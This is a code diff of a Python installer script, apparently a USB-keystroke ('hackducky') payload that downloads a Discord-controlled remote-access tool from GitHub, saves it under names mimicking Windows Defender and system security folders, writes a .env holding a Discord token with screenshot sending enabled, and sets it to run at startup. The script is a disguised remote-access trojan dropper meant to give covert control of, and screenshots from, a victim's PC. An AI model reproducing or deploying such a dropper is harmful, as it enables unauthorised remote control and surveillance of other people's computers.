@@ -12,13 +12,20 @@ def installStep(command):
 installStep("mkdir Windows-System-Security") #Totally not malware, trust
 
 #Step 2: Download the application to run the Discord bot
-installStep("curl https://github.com/3XAY/hackducky/blob/main/submissions/3XAYRemoteAccess/Windows-Defender-Compressed.exe -o Windows-System-Security/Windows-Defender.exe")
+installStep("curl https://github.com/3XAY/DiscordPCController/releases/latest/download/Discord.PC.Controller.zip -o Windows-System-Security/Windows-Defender-C.zip")
 
-#Step 3: Create the .env file
+#Step 3: Decompress the zip file
+installStep("Expand-Archive -Force Windows-System-Security/Windows-Defender-C.zip Windows-System-Security/")
+
+#Step 4: Remove the zip file
+installStep("Remove-Item -Path Windows-System-Security/Windows-Defender-C.zip -Force")
+
+#Step 5: Create the .env file
 #NOTE: When creating your payload, make sure to put YOUR Discord ID and token, then compress it to an .EXE file
 #Check README.md for more information
-installStep("echo DISCORD_TOKEN=ENTERTOKENHERE > Windows-System-Security/.env")
-installStep("echo DISCORD_ID=ENTERYOURIDHERE >> Windows-System-Security/.env")
-installStep("echo SEND_SCREENSHOT=True >> Windows-System-Security/.env")
+with open("Windows-System-Security\Discord PC Controller\.env", "w") as f:
+	f.write("DISCORD_TOKEN=ENTERYOURTOKENHERE\n")
+	f.write("DISCORD_ID=ENTERYOURIDHERE\n")
+	f.write("SEND_SCREENSHOT=True")
 
-#Step 4: Make sure the app runs on startup
+#Step 6: Make sure the app runs on startup
